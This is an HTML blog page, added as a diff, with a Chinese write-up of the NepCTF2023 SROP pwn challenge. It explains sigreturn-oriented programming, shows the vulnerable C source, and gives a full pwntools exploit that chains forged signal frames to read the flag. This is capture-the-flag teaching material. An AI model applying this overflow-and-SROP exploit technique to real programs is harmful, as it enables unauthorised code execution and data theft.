@@ -1,0 +1,344 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="这次比赛第一题就是很明显的SROP，正好啥也不会，学习了一下 SROPSROP全称为Sigreturn Oriented Programming，其攻击核心为通过伪造一个Signal Frame（以下简称sigFrame）在栈上，同时触发sigreturn系统调用，让内核为我们恢复一个sigFrame所描述的进程，如一个shell、一个wrtie系统调用打印栈地址等，同时通过对sigFrame中r">
+<meta property="og:type" content="article">
+<meta property="og:title" content="SROP初见杀-NepCTF2023">
+<meta property="og:url" content="http://example.com/2023/08/12/SROP/index.html">
+<meta property="og:site_name" content="Whirling-In-Rags">
+<meta property="og:description" content="这次比赛第一题就是很明显的SROP，正好啥也不会，学习了一下 SROPSROP全称为Sigreturn Oriented Programming，其攻击核心为通过伪造一个Signal Frame（以下简称sigFrame）在栈上，同时触发sigreturn系统调用，让内核为我们恢复一个sigFrame所描述的进程，如一个shell、一个wrtie系统调用打印栈地址等，同时通过对sigFrame中r">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://example.com/img/SROP.assets/image-20230812205434238.png">
+<meta property="og:image" content="http://example.com/img/SROP.assets/image-20230812205639153.png">
+<meta property="og:image" content="http://example.com/img/SROP.assets/image-20230812211245122.png">
+<meta property="article:published_time" content="2023-08-12T12:45:49.000Z">
+<meta property="article:modified_time" content="2024-11-22T15:05:58.802Z">
+<meta property="article:author" content="DeePunk">
+<meta property="article:tag" content="CTF">
+<meta property="article:tag" content="PWN">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/img/SROP.assets/image-20230812205434238.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>SROP初见杀-NepCTF2023</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="http://github.com/probberechts">Projects</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="Previous post" href="/2023/08/27/%E6%91%B8/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2023/08/11/IOFILE-exploit/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2023/08/12/SROP/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2023/08/12/SROP/&text=SROP初见杀-NepCTF2023"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2023/08/12/SROP/&title=SROP初见杀-NepCTF2023"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2023/08/12/SROP/&is_video=false&description=SROP初见杀-NepCTF2023"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=SROP初见杀-NepCTF2023&body=Check out this article: http://example.com/2023/08/12/SROP/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2023/08/12/SROP/&title=SROP初见杀-NepCTF2023"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2023/08/12/SROP/&title=SROP初见杀-NepCTF2023"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2023/08/12/SROP/&title=SROP初见杀-NepCTF2023"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2023/08/12/SROP/&title=SROP初见杀-NepCTF2023"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2023/08/12/SROP/&name=SROP初见杀-NepCTF2023&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2023/08/12/SROP/&t=SROP初见杀-NepCTF2023"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#SROP"><span class="toc-number">1.</span> <span class="toc-text">SROP</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Nepctf2023-SROP"><span class="toc-number">2.</span> <span class="toc-text">Nepctf2023-SROP</span></a></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        SROP初见杀-NepCTF2023
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">DeePunk</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2023-08-12T12:45:49.000Z" class="dt-published" itemprop="datePublished">2023-08-12</time>
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fa-solid fa-archive"></i>
+        <a class="category-link" href="/categories/CS/">CS</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/CTF/" rel="tag">CTF</a>, <a class="p-category" href="/tags/PWN/" rel="tag">PWN</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <p>这次比赛第一题就是很明显的<strong>SROP</strong>，正好啥也不会，学习了一下</p>
+<h1 id="SROP"><a href="#SROP" class="headerlink" title="SROP"></a>SROP</h1><p><strong>SROP</strong>全称为<strong>Sigreturn Oriented Programming</strong>，其攻击核心为通过伪造一个<strong>Signal Frame</strong>（以下简称<strong>sigFrame</strong>）在栈上，同时触发<strong>sigreturn</strong>系统调用，让内核为我们恢复一个sigFrame所描述的进程，如一个shell、一个wrtie系统调用打印栈地址等，同时通过对sigFrame中rsp和rip的修改，连接多个sigFrame，可通过多次触发sigreturn系统调用，依次恢复多个sigFrame，实现不同的功能，构成SROP攻击。一个sigFrame可理解为一个进程被挂起时，用于保存进程的数据结构，当进程恢复时，通过触发sigreturn来恢复sigFrame，从而恢复一个进程。</p>
+<p>以上内容是抄的，说白了就是：进程受到一个signal进入中断，内核会保存上下文（寄存器状态之类的，这个上下文存在<strong>sigFrame</strong>中），随后进入用户态执行处理函数，处理完最后又进入内核态恢复上下文</p>
+<p><img src="/../img/SROP.assets/image-20230812205434238.png" alt="image-20230812205434238"></p>
+<p>而这个保存上下文的sigFrame完全在<strong>用户空间</strong>，并且内核对进程挂起时保存的sigFrame以及恢复时还原的sigFrame<strong>没有做任何关联</strong>，这导致sigFrame可以被伪造</p>
+<p><img src="/../img/SROP.assets/image-20230812205639153.png" alt="image-20230812205639153"></p>
+<p>上图是64位的sigFrame结构。恢复上下文之前，会调用处理函数<strong>Signal Handler</strong>，该函数最后一个指令是<code>ret</code>，此时<code>rsp</code>正好指向sigFrame的栈顶，也就是存有函数<code>rt_sigreturn</code>地址的位置。随后调用<code>rt_sigreturn</code>，通过该函数完成上下文的恢复。</p>
+<p>因此，我们可以在<code>rsp</code>附近伪造sigFrame，通过调用<code>rt_sigreturn</code>完成寄存器的布置</p>
+<p>调用可以直接写内存，更常见的是进行调用号为0xf的系统调用</p>
+<blockquote>
+<p>小技巧：系统调用号可以通过<code>cat /usr/include/asm/unistd_64.h</code>查看</p>
+</blockquote>
+<p>另外，pwntools中的<code>SigreturnFrame()</code>可以方便完成寄存器的布置</p>
+<h1 id="Nepctf2023-SROP"><a href="#Nepctf2023-SROP" class="headerlink" title="Nepctf2023-SROP"></a>Nepctf2023-SROP</h1><p>源码都喂我嘴里了</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//gcc -no-pie pwn.c -fno-stack-protector -z now -o pwn  -lseccomp</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;seccomp.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/seccomp.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">char</span> buf[<span class="number">0x30</span>]=<span class="string">&quot;welcome to NepCTF2023!\n&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">seccomp</span><span class="params">()</span>&#123;</span><br><span class="line">    scmp_filter_ctx ctx;</span><br><span class="line">    ctx = seccomp_init(SCMP_ACT_KILL);</span><br><span class="line">    seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(open), <span class="number">0</span>);</span><br><span class="line">    seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(write), <span class="number">0</span>);</span><br><span class="line">    seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(read), <span class="number">0</span>);</span><br><span class="line">    seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(rt_sigreturn), <span class="number">0</span>);</span><br><span class="line">    seccomp_load(ctx);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">sys</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">15</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">     <span class="type">char</span> bd[<span class="number">0x30</span>];</span><br><span class="line">     seccomp();</span><br><span class="line">     syscall(<span class="number">1</span>,<span class="number">1</span>,buf,<span class="number">0x30</span>);</span><br><span class="line">     <span class="keyword">return</span> syscall(<span class="number">0</span>,<span class="number">0</span>,bd,<span class="number">0x300</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>显然需要打一个orw</p>
+<p>注意这里有一个坑，众所周知，<code>syscall</code>的系统调用号是通过<code>rax</code>传递，然而我们反汇编之后</p>
+<p><img src="/../img/SROP.assets/image-20230812211245122.png" alt="image-20230812211245122"></p>
+<p>令人意外的是，这里的<code>syscall</code>都是通过<code>rdi</code>传调用号的，猜测与这里使用<code>call syscall</code>而非直接使用<code>syscall</code>有关</p>
+<p>既然不用<code>rax</code>传调用号，那题目中的<code>sys()</code>函数也就没有意义了，好在能找到<code>pop rdi</code>的gadgets，可以任意布置</p>
+<p>我的思路是，先打一次srop，把flag写到bss段，顺便把栈迁移过去，随后挨着打orw</p>
+<p><strong>伪造sigFreame</strong>时需要<strong>格外注意</strong></p>
+<p><code>cs</code> <code>gs</code> <code>fs</code> <code>ss</code>需要<strong>保持不变</strong>！否则会报错！</p>
+<p>本人就在这里排查了很久</p>
+<p>可以按照如下写法</p>
+<p><code>sig.csgsfs = (0x002b * 0x1000000000000) | (0x0000 * 0x100000000) | (0x0000 * 0x10000) | (0x0033 * 0x1)</code></p>
+<p>从左往右依次为<code>cs</code> <code>gs</code> <code>fs</code> <code>ss</code></p>
+<p>exp如下</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python2</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line">context(os = <span class="string">&#x27;linux&#x27;</span>, arch = <span class="string">&#x27;amd64&#x27;</span>, log_level = <span class="string">&#x27;debug&#x27;</span>, terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;new-window&#x27;</span>])</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>(<span class="params">cmd=<span class="string">&#x27;&#x27;</span></span>):</span><br><span class="line">	cmd += <span class="string">&quot;b *0x0000000004007AE\n&quot;</span></span><br><span class="line">	gdb.attach(p, cmd)</span><br><span class="line">	pause()</span><br><span class="line"></span><br><span class="line">host = <span class="string">&quot;nepctf.1cepeak.cn&quot;</span></span><br><span class="line">port = <span class="number">30551</span></span><br><span class="line"><span class="comment">#p = process(&quot;./pwn&quot;)</span></span><br><span class="line">p = remote(host, port)</span><br><span class="line"></span><br><span class="line">sig = <span class="number">0x0000000000400750</span></span><br><span class="line">pop_rdi = <span class="number">0x0000000000400813</span></span><br><span class="line">syscall = <span class="number">0x00000000004007A8</span></span><br><span class="line">buf = <span class="number">0x0000000000601020</span></span><br><span class="line"></span><br><span class="line">p.recv()</span><br><span class="line">payload = <span class="string">&quot;\x00&quot;</span>*<span class="number">0x38</span> +p64(pop_rdi)+p64(<span class="number">0xf</span>)</span><br><span class="line">sig = SigreturnFrame()</span><br><span class="line">sig.uc_flags = syscall</span><br><span class="line">sig.rax = <span class="number">0</span></span><br><span class="line">sig.rdi = <span class="number">0</span></span><br><span class="line">sig.rsi = <span class="number">0</span></span><br><span class="line">sig.rdx = buf</span><br><span class="line">sig.rcx = <span class="number">0x1000</span></span><br><span class="line">sig.rip = syscall</span><br><span class="line">sig.rsp = buf+<span class="number">0x10</span></span><br><span class="line">sig.csgsfs = (<span class="number">0x002b</span> * <span class="number">0x1000000000000</span>) | (<span class="number">0x0000</span> * <span class="number">0x100000000</span>) | (<span class="number">0x0000</span> * <span class="number">0x10000</span>) | (<span class="number">0x0033</span> * <span class="number">0x1</span>)</span><br><span class="line">payload += <span class="built_in">str</span>(sig)</span><br><span class="line"></span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># debug()</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;flag\x00\x00\x00\x00&quot;</span></span><br><span class="line">payload += p64(pop_rdi) + p64(<span class="number">0xf</span>)</span><br><span class="line">sig = SigreturnFrame()</span><br><span class="line">sig.uc_flags = syscall</span><br><span class="line">sig.rax = <span class="number">0</span></span><br><span class="line">sig.rdi = <span class="number">2</span></span><br><span class="line">sig.rsi = buf</span><br><span class="line">sig.rdx = <span class="number">0</span></span><br><span class="line">sig.rcx = <span class="number">0</span></span><br><span class="line">sig.rip = syscall</span><br><span class="line">sig.rsp = buf+<span class="number">0x120</span></span><br><span class="line">sig.rbp = buf+<span class="number">0x120</span></span><br><span class="line">sig.csgsfs = (<span class="number">0x002b</span> * <span class="number">0x1000000000000</span>) | (<span class="number">0x0000</span> * <span class="number">0x100000000</span>) | (<span class="number">0x0000</span> * <span class="number">0x10000</span>) | (<span class="number">0x0033</span> * <span class="number">0x1</span>)</span><br><span class="line">payload += <span class="built_in">str</span>(sig)</span><br><span class="line"></span><br><span class="line">payload = payload.ljust(<span class="number">0x120</span>,<span class="string">&quot;\x00&quot;</span>)</span><br><span class="line">payload += p64(buf+<span class="number">0x120</span>)<span class="comment">#rbp</span></span><br><span class="line">payload += p64(pop_rdi) + p64(<span class="number">0xf</span>)</span><br><span class="line">sig = SigreturnFrame()</span><br><span class="line">sig.uc_flags = syscall</span><br><span class="line">sig.rax = <span class="number">0</span></span><br><span class="line">sig.rdi = <span class="number">0</span></span><br><span class="line">sig.rsi = <span class="number">3</span></span><br><span class="line">sig.rdx = buf</span><br><span class="line">sig.rcx = <span class="number">0x100</span></span><br><span class="line">sig.rip = syscall</span><br><span class="line">sig.rsp = buf+<span class="number">0x240</span></span><br><span class="line">sig.rbp = buf+<span class="number">0x240</span></span><br><span class="line">sig.csgsfs = (<span class="number">0x002b</span> * <span class="number">0x1000000000000</span>) | (<span class="number">0x0000</span> * <span class="number">0x100000000</span>) | (<span class="number">0x0000</span> * <span class="number">0x10000</span>) | (<span class="number">0x0033</span> * <span class="number">0x1</span>)</span><br><span class="line">payload += <span class="built_in">str</span>(sig)</span><br><span class="line"></span><br><span class="line">payload = payload.ljust(<span class="number">0x240</span>,<span class="string">&quot;\x00&quot;</span>)</span><br><span class="line">payload += p64(buf+<span class="number">0x240</span>)<span class="comment">#rbp</span></span><br><span class="line">payload += p64(pop_rdi) + p64(<span class="number">0xf</span>)</span><br><span class="line">sig = SigreturnFrame()</span><br><span class="line">sig.uc_flags = syscall</span><br><span class="line">sig.rax = <span class="number">0</span></span><br><span class="line">sig.rdi = <span class="number">1</span></span><br><span class="line">sig.rsi = <span class="number">1</span></span><br><span class="line">sig.rdx = buf</span><br><span class="line">sig.rcx = <span class="number">0x100</span></span><br><span class="line">sig.rip = syscall</span><br><span class="line">sig.rsp = buf+<span class="number">0x240</span></span><br><span class="line">sig.rbp = buf+<span class="number">0x240</span></span><br><span class="line">sig.csgsfs = (<span class="number">0x002b</span> * <span class="number">0x1000000000000</span>) | (<span class="number">0x0000</span> * <span class="number">0x100000000</span>) | (<span class="number">0x0000</span> * <span class="number">0x10000</span>) | (<span class="number">0x0033</span> * <span class="number">0x1</span>)</span><br><span class="line">payload += <span class="built_in">str</span>(sig)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">Home</a></li>
+        
+          <li><a href="/about/">About</a></li>
+        
+          <li><a href="/archives/">Writing</a></li>
+        
+          <li><a target="_blank" rel="noopener" href="http://github.com/probberechts">Projects</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#SROP"><span class="toc-number">1.</span> <span class="toc-text">SROP</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Nepctf2023-SROP"><span class="toc-number">2.</span> <span class="toc-text">Nepctf2023-SROP</span></a></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2023/08/12/SROP/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2023/08/12/SROP/&text=SROP初见杀-NepCTF2023"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2023/08/12/SROP/&title=SROP初见杀-NepCTF2023"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2023/08/12/SROP/&is_video=false&description=SROP初见杀-NepCTF2023"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=SROP初见杀-NepCTF2023&body=Check out this article: http://example.com/2023/08/12/SROP/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2023/08/12/SROP/&title=SROP初见杀-NepCTF2023"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2023/08/12/SROP/&title=SROP初见杀-NepCTF2023"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2023/08/12/SROP/&title=SROP初见杀-NepCTF2023"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2023/08/12/SROP/&title=SROP初见杀-NepCTF2023"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2023/08/12/SROP/&name=SROP初见杀-NepCTF2023&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2023/08/12/SROP/&t=SROP初见杀-NepCTF2023"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2016-2024
+    DeePunk
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="http://github.com/probberechts">Projects</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
